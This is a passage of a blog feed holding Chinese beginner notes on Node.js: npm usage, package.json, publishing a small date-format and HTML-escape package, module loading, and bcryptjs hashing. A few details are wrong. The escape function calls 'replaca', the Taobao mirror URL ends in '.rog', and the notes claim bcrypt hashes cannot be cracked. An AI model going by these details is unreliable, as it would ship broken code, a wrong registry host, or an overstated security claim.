class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dateFormat</span>(<span class="params">dtStr</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> dt = <span class="keyword">new</span> <span class="title class_">Date</span>(dtStr)</span><br><span class="line">  <span class="keyword">const</span> y = dt.<span class="title function_">getFullYear</span>()</span><br><span class="line">  <span class="keyword">const</span> m = <span class="title function_">padZero</span>(dt.<span class="title function_">getMonth</span>()+<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">const</span> d = <span class="title function_">padZero</span>(dt.<span class="title function_">getDate</span>())</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> hh = <span class="title function_">padZero</span>(dt.<span class="title function_">getHours</span>())</span><br><span class="line">  <span class="keyword">const</span> mm = <span class="title function_">padZero</span>(dt.<span class="title function_">getMinutes</span>())</span><br><span class="line">  <span class="keyword">const</span> ss = <span class="title function_">padZero</span>(dt.<span class="title function_">getSeconds</span>())</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;y&#125;</span>-<span class="subst">$&#123;m&#125;</span>-<span class="subst">$&#123;d&#125;</span> <span class="subst">$&#123;hh&#125;</span>:<span class="subst">$&#123;mm&#125;</span>:<span class="subst">$&#123;ss&#125;</span>`</span> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">padZero</span>(<span class="params">n</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (n &gt; <span class="number">9</span> ? n : <span class="string">&#x27;0&#x27;</span>+n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  dateFormat</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-格式化时间高级做法"><a href="#2-格式化时间高级做法" class="headerlink" title="2.格式化时间高级做法"></a>2.格式化时间高级做法</h4><blockquote><p>1.使用npm包管理工具，安装时间包moment</p><p>2.使用require</p><p>3.参考官方文档调用API</p></blockquote><h4 id="3-在项目中安装包"><a href="#3-在项目中安装包" class="headerlink" title="3.在项目中安装包"></a>3.在项目中安装包</h4><p>初次安装包后，会在项目文件夹下多一个叫做node_modules的文件夹和package-lock.json的文件</p><p>第一个用于存放所有一安装到项目中的包</p><p>第二个记录了第一个目录下每一个包的下载信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install 包的完整名称</span><br><span class="line">可以简写为</span><br><span class="line"> npm i 完整的名称</span><br></pre></td></tr></table></figure><h4 id="4-使用moment"><a href="#4-使用moment" class="headerlink" title="4.使用moment"></a>4.使用moment</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//导入</span></span><br><span class="line"><span class="keyword">const</span> moment = <span class="built_in">require</span>(<span class="string">&#x27;moment&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> dt = <span class="title function_">moment</span>().<span class="title function_">format</span>(<span class="string">&#x27;YYYY-MM-DD HH-mm-ss&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dt)</span><br></pre></td></tr></table></figure><h4 id="5-安装指定版本的包"><a href="#5-安装指定版本的包" class="headerlink" title="5.安装指定版本的包"></a>5.安装指定版本的包</h4><p>在包的名称之后，&#x3D;&#x3D;通过@符号跟上具体的版本号&#x3D;&#x3D;，从而安装指定版本的包</p><p>后安装的相同的包会覆盖原有的包</p><h4 id="6-包的语义化版本规范"><a href="#6-包的语义化版本规范" class="headerlink" title="6.包的语义化版本规范"></a>6.包的语义化版本规范</h4><p>包的版本号是按照点分十进制形式进行定义的，总共由三位数字</p><blockquote><p>1.第一位数字：大版本</p><p>2.第二位数字：功能版本</p><p>3.第三位数字：Bug修复版本</p></blockquote><h3 id="7-3包管理配置文件"><a href="#7-3包管理配置文件" class="headerlink" title="7.3包管理配置文件"></a>7.3包管理配置文件</h3><p>npm<strong>规定</strong>，在项目根目录中，必须提供一个叫做package.json的包配置管理文件，用来记录与项目有关的一些配置信息</p><ul><li><strong>项目的名称、版本号、描述等等</strong></li><li><strong>项目中用到了那些包</strong></li><li><strong>那些包只会在开发期间用到</strong></li><li><strong>那些包在开发和部署起家都会用到</strong></li></ul><h4 id="1-多人协作的问题"><a href="#1-多人协作的问题" class="headerlink" title="1.多人协作的问题"></a>1.多人协作的问题</h4><ol><li>第三方包体积过大，不方柏霓团队成员之间共享项目源代码</li></ol><h4 id="2-如何记录项目中安装了哪些包"><a href="#2-如何记录项目中安装了哪些包" class="headerlink" title="2.如何记录项目中安装了哪些包"></a>2.如何记录项目中安装了哪些包</h4><p>在项目根目录中，创建一个叫做&#x3D;&#x3D;package.json&#x3D;&#x3D;的配置文件，用于记录项目中安装了哪些包，</p><p>以后在项目开发中，一定要把<strong>node_modules文件夹</strong>，添加到.gitignore忽略文件中</p><h4 id="3-快速创建package-json"><a href="#3-快速创建package-json" class="headerlink" title="3.快速创建package.json"></a>3.快速创建package.json</h4><p>可以在执行目录中，快速创建package.json包管理配置文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init -y</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><blockquote><p>上述命令只能在英文目录下运行</p><p>运行npm install时，npm包管理工具会自动把包的名称和版本号，记录到package.json文件中</p></blockquote><p>**PS:**现在已经可以自动创建package.json文件了！</p><h4 id="4-depenencies节点"><a href="#4-depenencies节点" class="headerlink" title="4.depenencies节点"></a>4.depenencies节点</h4><p>这个节点，用于记录npm install 安装了哪些包，会记录包的名称和版本号</p><p><img src="/Node.js%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B.assets/image-20240324214311357.png" alt="image-20240324214311357"></p><h4 id="5-一次性安装所有包"><a href="#5-一次性安装所有包" class="headerlink" title="5.一次性安装所有包"></a>5.一次性安装所有包</h4><p>拿到一个node_module被删除了的项目之后，需要先把所有的包下载下来，不然运行不起来</p><p>使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install <span class="comment">//npm i</span></span><br></pre></td></tr></table></figure><p>可以一次性安装所有的包</p><h4 id="6-卸载包"><a href="#6-卸载包" class="headerlink" title="6.卸载包"></a>6.卸载包</h4><p>可以运行&#x3D;&#x3D;npm uninstall + 指定包&#x3D;&#x3D;命令</p><p>注意，删除包之后，在node_mudules中业户删除包信息</p><h4 id="7-devDependencies节点"><a href="#7-devDependencies节点" class="headerlink" title="7.devDependencies节点"></a>7.devDependencies节点</h4><p>如果某些包旨在项目开发阶段使用，可以把这些包记录到<strong>devDependencies</strong>节点中；</p><p>如果某些包在开发与上线中都要用到，那建议记录到<strong>Dependencies</strong></p><p>可以使用如下命令：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//安装指定包到devDependencies</span></span><br><span class="line">npm i 包名 -D</span><br><span class="line"><span class="comment">//上述命令是简写形式</span></span><br><span class="line">npm install 包名 --save-dev</span><br></pre></td></tr></table></figure><h3 id="7-4解决下包速度慢的问题"><a href="#7-4解决下包速度慢的问题" class="headerlink" title="7.4解决下包速度慢的问题"></a>7.4解决下包速度慢的问题</h3><h4 id="1-为什么慢"><a href="#1-为什么慢" class="headerlink" title="1.为什么慢"></a>1.为什么慢</h4><p>使用npm下包时，默认从国外网站进行下载</p><p>官方源 <a href="https://registry.npmjs.org/">https://registry.npmjs.org/</a></p><h4 id="2-淘宝镜像"><a href="#2-淘宝镜像" class="headerlink" title="2.淘宝镜像"></a>2.淘宝镜像</h4><p>&#x3D;&#x3D;已安装&#x3D;&#x3D;</p><h4 id="3-切换npm下包镜像源"><a href="#3-切换npm下包镜像源" class="headerlink" title="3.切换npm下包镜像源"></a>3.切换npm下包镜像源</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config get registry //查看下包源</span><br><span class="line">npm config set registry=https://registry.npm.taobao.rog/ //切换为淘宝镜像源</span><br></pre></td></tr></table></figure><h4 id="4-nrm"><a href="#4-nrm" class="headerlink" title="4.nrm"></a>4.nrm</h4><p>为了更方便切换，可以使用nrm这个工具，快速查看和切换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#安装全局</span><br><span class="line">npm i nrm -g</span><br><span class="line">#查看可用镜像源</span><br><span class="line">nrm ls</span><br><span class="line">#将下包镜像源切换为taobao</span><br><span class="line">nrm use taobao</span><br></pre></td></tr></table></figure><h3 id="7-5包的分类"><a href="#7-5包的分类" class="headerlink" title="7.5包的分类"></a>7.5包的分类</h3><h4 id="1-项目包"><a href="#1-项目包" class="headerlink" title="1.项目包"></a>1.项目包</h4><p>那些被安装到项目中的node_modules的包，都是项目包</p><blockquote><p>开发依赖包 在devD</p><p>核心依赖包 在D</p></blockquote><h4 id="2-全局包"><a href="#2-全局包" class="headerlink" title="2.全局包"></a>2.全局包</h4><p>在执行&#x3D;&#x3D;npm install&#x3D;&#x3D;时候，如果提供了-g参数，则会把她安装为全局包</p><p>&#x3D;&#x3D;注意-&#x3D;&#x3D;</p><p>只有工具性的包，才有全局安装的必要***</p><p>判断某个包是否全局才能使用，查看官方文档即可***</p><h4 id="3-i5ting-toc"><a href="#3-i5ting-toc" class="headerlink" title="3.i5ting_toc"></a>3.i5ting_toc</h4><blockquote><p>i5ting_doc是一个可以把md文档转为htnl页面的小工具，使用步骤如下</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#将其安装为全局包</span><br><span class="line">npm install -g i5ting_toc</span><br><span class="line">#调用i5ting_toc，轻松和实现md 转 html页面功能</span><br><span class="line">i5ting_toc -f 要转换的md文件路径 -o</span><br></pre></td></tr></table></figure><h4 id="4-规范的包结构"><a href="#4-规范的包结构" class="headerlink" title="4.规范的包结构"></a>4.规范的包结构</h4><ol><li>每一个包都需要单独的目录</li><li>包的顶级目录下必须要package.json这个配置文件</li><li>package.json必须包含name,version,main三个属性，对应了包的名字、版本号和包的入口</li></ol><h3 id="7-6开发属于自己的包"><a href="#7-6开发属于自己的包" class="headerlink" title="7.6开发属于自己的包"></a>7.6开发属于自己的包</h3><h4 id="1-skip"><a href="#1-skip" class="headerlink" title="1.skip"></a>1.skip</h4><h4 id="2-初始化包的基本结构"><a href="#2-初始化包的基本结构" class="headerlink" title="2.初始化包的基本结构"></a>2.初始化包的基本结构</h4><ol><li>新建itheima-tools文件夹，作为包的根目录</li><li>在itheima-tools文件夹中华，新建如下三个文件<ul><li>package.json</li><li>index.js</li><li>README.md</li></ul></li></ol><h4 id="3-初始化package-json"><a href="#3-初始化package-json" class="headerlink" title="3.初始化package.json"></a>3.初始化package.json</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ycx_tools&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;index.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;提供了格式化时间、HTMLESCAPE的功能&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;keywords&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;ycx_tools&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;format&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;ycx&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;escape&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span><span class="string">&quot;ISC&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="4-在index-js中定义方法"><a href="#4-在index-js中定义方法" class="headerlink" title="4.在index.js中定义方法"></a>4.在index.js中定义方法</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dateFormat</span>(<span class="params">dtStr</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> dt = <span class="keyword">new</span> <span class="title class_">Date</span>(dtStr)</span><br><span class="line">  <span class="keyword">const</span> y = dt.<span class="title function_">getFullYear</span>()</span><br><span class="line">  <span class="keyword">const</span> m = <span class="title function_">padZero</span>(dt.<span class="title function_">getMonth</span>()+<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">const</span> d = <span class="title function_">padZero</span>(dt.<span class="title function_">getDate</span>())</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> hh = <span class="title function_">padZero</span>(dt.<span class="title function_">getHours</span>())</span><br><span class="line">  <span class="keyword">const</span> mm = <span class="title function_">padZero</span>(dt.<span class="title function_">getMinutes</span>())</span><br><span class="line">  <span class="keyword">const</span> ss = <span class="title function_">padZero</span>(dt.<span class="title function_">getSeconds</span>())</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;y&#125;</span>-<span class="subst">$&#123;m&#125;</span>-<span class="subst">$&#123;d&#125;</span> <span class="subst">$&#123;hh&#125;</span>:<span class="subst">$&#123;mm&#125;</span>:<span class="subst">$&#123;ss&#125;</span>`</span> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">padZero</span>(<span class="params">n</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (n &gt; <span class="number">9</span> ? n : <span class="string">&#x27;0&#x27;</span>+n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  dateFormat</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>即使require没有指定文件，根据package.json中的main属性来查找</strong></p><h4 id="5-在index-js中定义转移HTML的方法"><a href="#5-在index-js中定义转移HTML的方法" class="headerlink" title="5.在index.js中定义转移HTML的方法"></a>5.在index.js中定义转移HTML的方法</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义转移html</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">htmlescape</span>(<span class="params">htmlStr</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> htmlStr.<span class="title function_">replaca</span>(<span class="regexp">/&lt;|&gt;|&quot;|&amp;/g</span>, <span class="function">(<span class="params">match</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (match) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">`&lt;`</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&amp;lt;&#x27;</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">`&gt;`</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&amp;gt;&#x27;</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">`&quot;`</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&amp;quot;&#x27;</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">`&amp;`</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&amp;amp;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="6-index-js定义还原HTML的方法"><a href="#6-index-js定义还原HTML的方法" class="headerlink" title="6.index.js定义还原HTML的方法"></a>6.index.js定义还原HTML的方法</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义还原HTML</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">htmlUnEscape</span>(<span class="params">str</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> str.<span class="title function_">replace</span>(<span class="regexp">/&amp;lt;|&amp;gt;|&amp;quot;|&amp;amp;/g</span>, <span class="function">(<span class="params">match</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (match) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">`&amp;lt;`</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">`&amp;gt;`</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">`&amp;quot;`</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">`&amp;amp;`</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&amp;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="7-将不同的功能纪念性模块化拆分"><a href="#7-将不同的功能纪念性模块化拆分" class="headerlink" title="7.将不同的功能纪念性模块化拆分"></a>7.将不同的功能纪念性模块化拆分</h4><blockquote><ol><li>将格式化时间的功能，拆分到src-&gt;dateFormat.js中</li><li>将处理HTML字符换的功能，拆分到src-&gt;htmlescape.js中</li><li>在index.js中，导入两个模块，得到需要向外共享的方法</li></ol><p>4.在index.js中，使用module.exports把对应的方法共享出去</p></blockquote><p><strong>es6–扩展运算符</strong> 将数组或者对象的内容转换为一段以逗号隔开的序列</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  ...date,<span class="comment">//展开运算符</span></span><br><span class="line">  ...<span class="built_in">escape</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="8-编写包的说明文档"><a href="#8-编写包的说明文档" class="headerlink" title="8.编写包的说明文档"></a>8.编写包的说明文档</h4><p>README.md文档用于说明包</p><p><strong>可以包含以下说明</strong></p><blockquote><p>安装方式、导入方式、格式化时间</p><p>转移HTML中的特殊字符、还原HTML中的特殊字符、开源协议</p></blockquote><h3 id="7-7发布包"><a href="#7-7发布包" class="headerlink" title="7.7发布包"></a>7.7发布包</h3><h4 id="1-注册账号"><a href="#1-注册账号" class="headerlink" title="1.注册账号"></a>1.注册账号</h4><p>&#x3D;&#x3D;已注册&#x3D;&#x3D;</p><h4 id="2-登录"><a href="#2-登录" class="headerlink" title="2.登录"></a>2.登录</h4><p>在命令行中输入 <code>npm login</code> 进行登录</p><p><strong>注意，使用之前需要先将服务器切换到官方服务器</strong></p><p><code>npm config set registry=https://registry.npmjs.org/</code></p><h4 id="3-把包发布到npm上"><a href="#3-把包发布到npm上" class="headerlink" title="3.把包发布到npm上"></a>3.把包发布到npm上</h4><blockquote><p>将终端切换到包的根目录，运行 npm publish命令，即可发布</p></blockquote><p><img src="/Node.js%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B.assets/image-20240325110008091.png" alt="image-20240325110008091"></p><p>发布成功!!!</p><h4 id="4-删除已发布的包"><a href="#4-删除已发布的包" class="headerlink" title="4.删除已发布的包"></a>4.删除已发布的包</h4><p><strong>注意</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm unpublish 包名 --force，即可删除</span><br></pre></td></tr></table></figure><blockquote><p>npm unpublish命令只能删除72小时以内的包</p><p>npm unpublish删除的包，在24小时内不能重新发布</p><p>尽量不要发布没有意义的包</p></blockquote><h2 id="8-模块的缓存机制"><a href="#8-模块的缓存机制" class="headerlink" title="8.模块的缓存机制"></a>8.模块的缓存机制</h2><h4 id="1-优先从缓存中加载"><a href="#1-优先从缓存中加载" class="headerlink" title="1.优先从缓存中加载"></a>1.优先从缓存中加载</h4><p>模块第一次加载会被缓存，这也意味着多次调用require()不会导致模块代码被执行多次</p><p><strong>注意</strong>  各种模块都会从缓存中加载，从而提高模块的加载效率</p><h4 id="2-内置模块加载机制"><a href="#2-内置模块加载机制" class="headerlink" title="2.内置模块加载机制"></a>2.内置模块加载机制</h4><blockquote><p>内置模块是Node.js提供的模块，优先级最高。</p></blockquote><h4 id="3-自定义模块加载机制"><a href="#3-自定义模块加载机制" class="headerlink" title="3.自定义模块加载机制"></a>3.自定义模块加载机制</h4><p>使用require()加载自定义模块是，必须指定以.&#x2F; 或者 ..&#x2F;开头的路径标识符，否则node会把他当作第三方模块或者内置模块加载</p><p>如果省略了文件扩展名，那么node或按照一下顺序分别尝试加载文件</p><ol><li>按照确切的文件名进行加载</li><li>补全.js进行加载</li><li>补全.json进行</li><li>补全.node</li><li>加载失败</li></ol><h4 id="4-第三方模块加载机制"><a href="#4-第三方模块加载机制" class="headerlink" title="4.第三方模块加载机制"></a>4.第三方模块加载机制</h4><p>如果传递给require的不符合上述两种规则，则node.js会从当前模块父目录开始，尝试从&#x2F;node_modules加载第三方模块</p><p>如果没有找到，则移动到再上一层父目录中，直到磁盘根目录中。</p><h4 id="5-目录作为模块"><a href="#5-目录作为模块" class="headerlink" title="5.目录作为模块"></a>5.目录作为模块</h4><p>把目录作为标识符，传递给require()时，有三种加载方式</p><blockquote><ol><li>被加载目录下查找一个叫做package.json的文件，并寻找main属性，作为require()入口</li><li>如果没有.json文件按，或者main不存在或者无法解析，则Node.js或试图加载目录下的index.js文件</li><li>如果都失败了，会打印模块缺失 Error:Cannot find module ‘xxx’</li></ol></blockquote><h4 id="6-使用bcryptjs堆用户密码进行加密"><a href="#6-使用bcryptjs堆用户密码进行加密" class="headerlink" title="6.使用bcryptjs堆用户密码进行加密"></a>6.使用<code>bcryptjs</code>堆用户密码进行加密</h4><p>&#x3D;&#x3D;优点&#x3D;&#x3D;</p><blockquote><p>1.加密之后的密码，无法被破解</p><p>2.同一明文密码多次加密，得到的加密结果不相同</p></blockquote><h4 id="7-使用bcrypt"><a href="#7-使用bcrypt" class="headerlink" title="7.使用bcrypt"></a>7.使用bcrypt</h4><ol><li>运行如下命令安装：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i bcryptjs@2.4.3</span><br></pre></td></tr></table></figure><ol start="2"><li>在&#x2F;router_handler&#x2F;user.js中导入</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> bcrypt=<span class="built_in">require</span>(<span class="string">&#x27;bcryptjs&#x27;</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li>在注册用户的处理函数中，确认用户名可用之后，调用bcrypt.hashSync(明文密码，随机盐的长度)方法</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userinfo.<span class="property">password</span>=bcrypt.<span class="title function_">hashSync</span>(userinfo.<span class="property">password</span>,<span class="number">10</span>)</span><br></pre></td></tr></table></figure><ol start="4"><li>如何进行密码的判断</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> compareRes=bcrypt.<span class="title function_">compareSync</span>(输入密码，服务端密码)</span><br></pre></td></tr></table></figure><h4 id="8-判断err是否是Error对象"><a href="#8-判断err是否是Error对象" class="headerlink" title="8.判断err是否是Error对象"></a>8.判断err是否是Error对象</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">res.<span class="property">cc</span> = <span class="function">(<span class="params">err, status = <span class="number">1</span></span>) =&gt;</span> &#123;</span><br><span class="line">   res.<span class="title function_">send</span>(&#123;</span><br><span class="line">     status,</span><br><span class="line">     <span class="attr">message</span>:err <span class="keyword">instanceof</span> <span class="title class_">Error</span>?err.<span class="property">message</span> :err,</span><br><span class="line">   &#125;)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="9-优化表单数据验证"><a href="#9-优化表单数据验证" class="headerlink" title="9.优化表单数据验证"></a>9.优化表单数据验证</h4><ol><li>用第三方包来对数据进行验证，通过@hspi&#x2F;joi来定义验证规则</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i @hapi/joi@<span class="number">17.1</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><ol start="2"><li>安装@escook&#x2F;express-joi中间件，来实现自动对表单数据验证的功能</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i @escook/express-joi</span><br></pre></td></tr></table></figure><h2 id="附："><a href="#附：" class="headerlink" title="附："></a>附：</h2><blockquote><p>es6之解构</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; name &#125; = user;  <span class="comment">//定义变量name ,把user当做对象处理，并取其属性name ，赋值给变量name </span></span><br><span class="line"><span class="comment">//等价于</span></span><br><span class="line"><span class="keyword">const</span> name= user.<span class="property">name</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在服务器端生成token字符串</span></span><br><span class="line"><span class="keyword">const</span> user=&#123;...results[<span class="number">0</span>],<span class="attr">password</span>:<span class="string">&#x27;&#x27;</span>,<span class="attr">user_pic</span>:<span class="string">&#x27;&#x27;</span>&#125; <span class="comment">//这里...表示展开这个对象，后面表示用于替换的字符串</span></span><br></pre></td></tr></table></figure></style></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Node-js使用教程&quot;&gt;&lt;a href=&quot;#Node-js使用教程&quot; class=&quot;headerlink&quot; title=&quot;Node.js使用教程&quot;&gt;&lt;/a&gt;Node.js使用教程&lt;/h1&gt;&lt;p align=&quot;center&quot;&gt;
  &lt;br&gt;
  &lt;/p&gt;&lt;h2 s</summary>
      
    
    
    
    <category term="node.js" scheme="https://ycx6666.github.io/categories/node-js/"/>
    
    
    <category term="入门" scheme="https://ycx6666.github.io/tags/%E5%85%A5%E9%97%A8/"/>
    
    <category term="nodejs" scheme="https://ycx6666.github.io/tags/nodejs/"/>
    
  </entry>
  
  <entry>
    <title>协变返回类型</title>
    <link href="https://ycx6666.github.io/2024/03/%E5%8D%8F%E5%8F%98%E8%BF%94%E5%9B%9E%E7%B1%BB%E5%9E%8B/"/>
    <id>https://ycx6666.github.io/2024/03/%E5%8D%8F%E5%8F%98%E8%BF%94%E5%9B%9E%E7%B1%BB%E5%9E%8B/</id>
